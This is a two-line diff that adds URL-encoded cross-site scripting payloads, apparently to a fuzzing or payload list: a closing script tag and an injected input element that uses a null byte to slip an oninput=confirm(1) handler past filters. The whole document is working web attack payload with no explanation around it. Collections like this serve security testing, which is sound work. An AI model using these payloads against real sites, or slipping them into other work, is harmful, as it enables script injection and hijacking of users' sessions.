@@ -1,0 +1,2 @@
+%3C/script%20%3E
+mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
